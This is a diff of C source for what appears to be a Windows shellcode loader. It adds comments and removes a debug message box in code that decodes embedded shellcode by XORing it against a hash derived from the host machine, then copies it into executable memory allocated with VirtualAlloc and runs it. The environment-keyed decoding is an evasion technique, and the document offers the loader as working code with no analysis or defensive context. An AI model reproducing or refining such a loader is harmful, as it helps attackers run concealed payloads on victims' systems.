@@ -41,10 +41,10 @@ void CheckExecution() {
 	// Perform the Mutex check; if it is already running, quit now
 	if (!MutexCheck(MUTEX_NAME)) return;
 
-
+	// XOR the shellcode 
 	DecodeShellcode();
-	MessageBox(NULL, "Runs", NULL, NULL);
 
+	// Now run it
 	ExecuteShellcode(&shellcode, shellcodelen);
 	
 	return;
@@ -90,8 +90,7 @@ unsigned int HashCheck() {
 //////////////////////////////////////////////////////////////////////////////////
 
 void DecodeShellcode() {
-	HGLOBAL *cn;
-	HGLOBAL *cnhash;
+	unsigned char *cn, *cnhash;
 	unsigned int ret;
 
 	unsigned int sc = 0; // Shellcode position marker
@@ -104,9 +103,9 @@ void DecodeShellcode() {
 			// Loop through the shellcode
 			for (sc = 0; sc < shellcodelen; sc++) {
 				
-				for (hc = 0; hc < HASH_LEN; hc++) {
-					shellcode[sc] ^= (unsigned char) cnhash[hc];
-				}
+				// XOR the shellcode against the hash derived
+				// from the host
+				shellcode[sc] ^= cnhash[hc];
 
 				// Loop through the hash
 				if (hc == HASH_LEN - 1) {
@@ -264,11 +263,11 @@ HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
 void ExecuteShellcode(BYTE *buf, unsigned int size) {
 
 	char *buffer;
-	void(*sc)();
+	void (*sc) (); // Essentially create a function pointer
 
 	buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(buffer, buf, size);
-	sc = (void(*)()) buffer;
+	sc = buffer;
 	sc();
 
 }
